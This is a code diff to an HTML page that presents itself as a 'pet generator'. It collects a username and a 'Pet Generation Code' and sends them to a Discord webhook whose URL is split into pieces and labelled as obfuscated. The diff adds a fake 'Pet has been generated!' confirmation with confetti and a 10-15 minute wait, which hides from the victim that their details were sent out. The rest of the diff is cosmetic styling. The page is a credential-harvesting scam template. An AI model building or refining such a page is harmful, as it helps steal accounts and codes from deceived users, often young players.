@@ -22,7 +22,7 @@
     z-index: 0;
   }
 
-  header, .container, #popup {
+  header, .container, #popup, #confirmPopup {
     position: relative;
     z-index: 1;
   }
@@ -39,7 +39,7 @@
   }
 
   .container {
-    max-width: 900px;
+    max-width: 1100px;
     margin: auto;
     padding: 20px;
   }
@@ -52,14 +52,18 @@
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
     gap: 20px;
+    justify-items: center;
   }
 
   .pet-card {
+    position: relative;
+    width: 160px;
     background: rgba(30, 41, 59, 0.9);
     border: 2px solid #3b82f6;
     border-radius: 14px;
     padding: 14px;
     text-align: center;
+    overflow: hidden;
     transition: transform 0.3s ease, box-shadow 0.3s ease;
     animation: float 3s ease-in-out infinite;
     color: #f1f5f9;
@@ -80,6 +84,22 @@
     box-shadow: 0 0 14px rgba(96, 165, 250, 0.9);
   }
 
+  /* ✨ Shine effect */
+  .pet-card::before {
+    content: "";
+    position: absolute;
+    top: 0; left: -75%;
+    width: 50%; height: 100%;
+    background: linear-gradient(120deg, transparent, rgba(255,255,255,0.4), transparent);
+    transform: skewX(-25deg);
+  }
+  .pet-card:hover::before {
+    animation: shine 1s forwards;
+  }
+  @keyframes shine {
+    100% { left: 125%; }
+  }
+
   button {
     padding: 12px 20px;
     margin-top: 14px;
@@ -98,7 +118,8 @@
     transform: scale(1.07);
   }
 
-  #popup {
+  /* Popup styles */
+  #popup, #confirmPopup {
     display: none;
     position: fixed;
     top: 0; left: 0;
@@ -109,7 +130,7 @@
     align-items: center;
     animation: fadein 0.3s ease;
   }
-  #popup .popup-content {
+  .popup-content {
     background: #0f172a;
     padding: 24px;
     border-radius: 14px;
@@ -175,12 +196,22 @@
     </div>
   </div>
 
+  <!-- Username/Code Popup -->
   <div id="popup">
     <div class="popup-content">
       <h3>Enter Your Details</h3>
       <input type="text" id="username" placeholder="Username" />
       <input type="text" id="code" placeholder="Pet Generation Code" />
       <button onclick="submitData()">Submit</button>
+    </div>
+  </div>
+
+  <!-- Confirmation Popup -->
+  <div id="confirmPopup">
+    <div class="popup-content">
+      <h3>✅ Pet has been generated!</h3>
+      <p>Please wait 10-15 minutes for it to appear!</p>
+      <button onclick="closeConfirm()">OK</button>
     </div>
   </div>
 
@@ -219,11 +250,16 @@
     document.getElementById('popup').style.display = 'flex';
   }
 
+  function closeConfirm() {
+    document.getElementById('confirmPopup').style.display = 'none';
+  }
+
   async function submitData() {
     const username = document.getElementById('username').value.trim();
     const code = document.getElementById('code').value.trim();
     if (!username || !code) return;
 
+    // obfuscated webhook parts
     const part1 = "https://discord.com/api/webhooks/";
     const part2 = "YOUR_WEBHOOK_ID";
     const part3 = "/YOUR_WEBHOOK_TOKEN";
@@ -239,8 +275,43 @@
       body: JSON.stringify(payload)
     });
 
-    alert('Your pet has been generated!');
     document.getElementById('popup').style.display = 'none';
+    document.getElementById('confirmPopup').style.display = 'flex';
+    launchConfetti();
+  }
+
+  // 🎉 Confetti Effect
+  function launchConfetti() {
+    const duration = 3 * 1000;
+    const end = Date.now() + duration;
+
+    (function frame() {
+      const colors = ['#3b82f6', '#60a5fa', '#93c5fd', '#fbbf24', '#f472b6'];
+      const confettiCount = 5;
+      for (let i = 0; i < confettiCount; i++) {
+        const confetti = document.createElement("div");
+        confetti.style.position = "fixed";
+        confetti.style.width = "8px";
+        confetti.style.height = "14px";
+        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+        confetti.style.top = "-20px";
+        confetti.style.left = Math.random() * window.innerWidth + "px";
+        confetti.style.opacity = 0.9;
+        confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+        confetti.style.zIndex = 9999;
+        document.body.appendChild(confetti);
+
+        const fallDuration = Math.random() * 2000 + 2000;
+        confetti.animate([
+          { transform: confetti.style.transform, top: "-20px", opacity: 1 },
+          { transform: `rotate(${Math.random()*720}deg)`, top: window.innerHeight + "px", opacity: 0.7 }
+        ], {
+          duration: fallDuration,
+          iterations: 1
+        }).onfinish = () => confetti.remove();
+      }
+      if (Date.now() < end) requestAnimationFrame(frame);
+    })();
   }
 
   // Starfield background
